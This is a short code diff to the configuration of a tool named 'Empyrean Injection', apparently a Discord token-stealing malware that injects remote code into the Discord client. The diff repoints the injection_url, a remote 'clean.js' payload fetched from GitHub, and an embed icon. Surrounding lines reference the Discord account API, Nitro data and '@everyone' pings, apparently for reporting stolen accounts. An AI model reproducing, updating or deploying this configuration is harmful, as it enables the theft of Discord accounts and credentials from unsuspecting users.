@@ -12,9 +12,9 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Empyrean Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/991453806267203624/1066440196628942978/Empyrean_Pyke.png',
+  embed_icon: 'https://raw.githubusercontent.com/Entity378/Injection/main/images/avatar.png',
   embed_color: 2840158, 
-  injection_url: 'https://raw.githubusercontent.com/Entity378/Discord-Injection/main/clean.js',
+  injection_url: 'https://raw.githubusercontent.com/Entity378/Injection/main/clean.js',
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
